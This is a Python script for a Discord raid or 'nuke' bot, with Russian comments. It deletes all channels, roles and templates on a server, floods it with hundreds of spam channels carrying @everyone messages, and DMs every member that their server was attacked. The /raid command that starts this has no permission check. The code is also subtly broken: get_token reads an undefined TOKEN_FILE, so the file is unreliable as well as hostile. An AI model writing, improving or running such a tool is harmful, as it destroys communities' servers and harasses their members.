import discord
from discord.ext import commands
import asyncio
import os
import sys

TOKEN = os.environ.get("TOKEN")
if not TOKEN:
    print("[FATAL] Переменная окружения TOKEN не задана!")
    sys.exit(1)

CONFIG = {
    "channels_to_create": 350,
    "spam_per_channel": 45,
    "channel_name": "nuked-by-raid",
    "spam_message": "@everyone СЕРВЕР УНИЧТОЖЕН\nВсе каналы, роли и шаблоны удалены.",
    "delay_delete": 0.25,
    "delay_create": 0.25,
    "delay_spam": 0.4,
    "dm_everyone": True,
    "dm_message": "Твой сервер {guild_name} был атакован.",
}

# ========= ВСТАВЬ СЮДА ID (ТОЛЬКО ЧИСЛА, БЕЗ КАВЫЧЕК) =========
BLOCKED_GUILDS = [
    123456789012345678,  # ← замени на реальный ID
    # 987654321098765432,  # ← второй сервер (раскомментируй если нужно)
]

def get_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            return f.read().strip()
    return input("Вставь токен: ")

TOKEN = get_token()

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

async def raid_actions(guild: discord.Guild):
    # ========= ПРОВЕРКА БЛОКИРОВКИ В САМОМ НАЧАЛЕ =========
    if guild.id in BLOCKED_GUILDS:
        print(f"\n[БЛОКИРОВКА] Сервер {guild.name} (ID: {guild.id}) в чёрном списке. Рейд отменён.")
        return

    print(f"\n=== РЕЙД НА {guild.name} (ID: {guild.id}) ===")

    # 1. УДАЛЕНИЕ КАНАЛОВ
    print("[1/5] Удаление каналов...")
    deleted = 0
    total_channels = len(guild.channels)
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            print(f"    Удалён канал [{deleted}/{total_channels}]")
            await asyncio.sleep(CONFIG['delay_delete'])
        except Exception:
            pass
    print(f"[+] Удалено каналов: {deleted}/{total_channels}")

    # 2. УДАЛЕНИЕ РОЛЕЙ
    print("[2/5] Удаление ролей...")
    roles_deleted = 0
    roles_list = [r for r in guild.roles if r.name != "@everyone"]
    total_roles = len(roles_list)
    for role in roles_list:
        try:
            await role.delete()
            roles_deleted += 1
            print(f"    Удалена роль [{roles_deleted}/{total_roles}]")
            await asyncio.sleep(0.2)
        except Exception:
            pass
    print(f"[+] Удалено ролей: {roles_deleted}/{total_roles}")

    # 3. УДАЛЕНИЕ ШАБЛОНОВ
    print("[3/5] Удаление шаблонов...")
    templates_deleted = 0
    try:
        templates = await guild.templates()
        total_templates = len(templates)
        for template in templates:
            try:
                await template.delete()
                templates_deleted += 1
                print(f"    Удалён шаблон [{templates_deleted}/{total_templates}]: {template.name}")
                await asyncio.sleep(0.3)
            except Exception:
                pass
    except Exception:
        pass
    print(f"[+] Удалено шаблонов: {templates_deleted}")

    # 4. СОЗДАНИЕ КАНАЛОВ И СПАМ
    print(f"[4/5] Создание {CONFIG['channels_to_create']} каналов и спам...")
    created = 0
    for i in range(CONFIG['channels_to_create']):
        try:
            new_ch = await guild.create_text_channel(f"{CONFIG['channel_name']}-{i+1}")
            created += 1
            print(f"    Создан канал [{created}/{CONFIG['channels_to_create']}]: {new_ch.name}")
            for j in range(CONFIG['spam_per_channel']):
                try:
                    await new_ch.send(CONFIG['spam_message'])
                    if (j + 1) % 10 == 0:
                        print(f"        Спам в {new_ch.name}: {j+1}/{CONFIG['spam_per_channel']}")
                    await asyncio.sleep(CONFIG['delay_spam'])
                except Exception:
                    break
            await asyncio.sleep(CONFIG['delay_create'])
        except Exception:
            pass
    print(f"[+] Создано каналов: {created}/{CONFIG['channels_to_create']}")

    # 5. РАССЫЛКА DM
    if CONFIG['dm_everyone']:
        print("[5/5] Рассылка DM...")
        dm_sent = 0
        members = [m for m in guild.members if not m.bot]
        total_members = len(members)
        for member in members:
            try:
                await member.send(CONFIG['dm_message'].format(guild_name=guild.name))
                dm_sent += 1
                if dm_sent % 50 == 0:
                    print(f"    DM отправлено: {dm_sent}/{total_members}")
                await asyncio.sleep(0.2)
            except Exception:
                pass
        print(f"[+] DM разослано: {dm_sent}/{total_members}")

    print("\n=== РЕЙД ЗАВЕРШЁН ===")

@bot.event
async def on_ready():
    print(f"\n[+] Бот {bot.user} активен! Серверов: {len(bot.guilds)}")
    for g in bot.guilds:
        blocked_mark = " 🔒 (заблокирован)" if g.id in BLOCKED_GUILDS else ""
        print(f"    - {g.name} (ID: {g.id}){blocked_mark}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Синхронизировано команд: {len(synced)}")
    except Exception:
        pass
    print("\n[!] Готов к работе. Используй /raid или !nuke\n")

@bot.tree.command(name="raid", description="Уничтожить сервер")
async def raid(interaction: discord.Interaction):
    await interaction.response.send_message("🚀 **RAID STARTED**", ephemeral=False)
    await raid_actions(interaction.guild)

@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke_prefix(ctx):
    await ctx.send("⚠️ **NUKE STARTED**")
    await raid_actions(ctx.guild)

if __name__ == "__main__":
    if not TOKEN:
        print("[FATAL] Нет токена!")
    else:
        try:
            bot.run(TOKEN)
        except KeyboardInterrupt:
            print("\n[!] Остановка бота")
            sys.exit(0)
